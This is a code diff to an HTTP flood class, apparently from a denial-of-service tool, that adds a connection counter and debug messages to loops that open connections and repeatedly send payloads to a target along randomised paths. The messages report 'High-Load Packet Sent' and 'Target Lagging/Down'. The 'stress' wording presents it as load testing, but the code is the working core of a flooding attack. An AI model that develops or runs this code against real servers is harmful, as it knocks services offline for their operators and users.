@@ -1139,6 +1139,10 @@ class HttpFlood(Thread):
         s = None
         try:
              s = self.open_connection()
+             global CONNECTIONS_SENT
+             CONNECTIONS_SENT += 1
+             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: High-Load Packet Sent to {self._target.authority}")
+
              for _ in range(self._rpc):
                 # [OPTIMIZED] Dynamic Path
                 path = self.get_random_target_path()
@@ -1159,6 +1163,7 @@ class HttpFlood(Thread):
         except Exception as e:
             err = str(e)
             if "timed out" in err or "Timeout" in err:
+                print(f"[DEBUG] STRESS: Connection Timeout (Target Lagging/Down)")
                 pass
             elif "[Errno 111]" in err or "Connection refused" in err:
                 pass
@@ -1367,14 +1372,16 @@ class HttpFlood(Thread):
         s = None
         try:
             s = self.open_connection()
+            global CONNECTIONS_SENT
+            CONNECTIONS_SENT += 1
+            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
-                    # global REQUESTS_SENT
-                    # print(f"[{int(REQUESTS_SENT)}] [DEBUG] DYN: Packet Sent")
                     pass
         except Exception as e:
             err = str(e)
             if "timed out" in err or "Timeout" in err:
+                print(f"[DEBUG] DYN: Connection Timeout (Target Lagging/Down)")
                 pass
             elif "[Errno 111]" in err or "Connection refused" in err:
                 pass
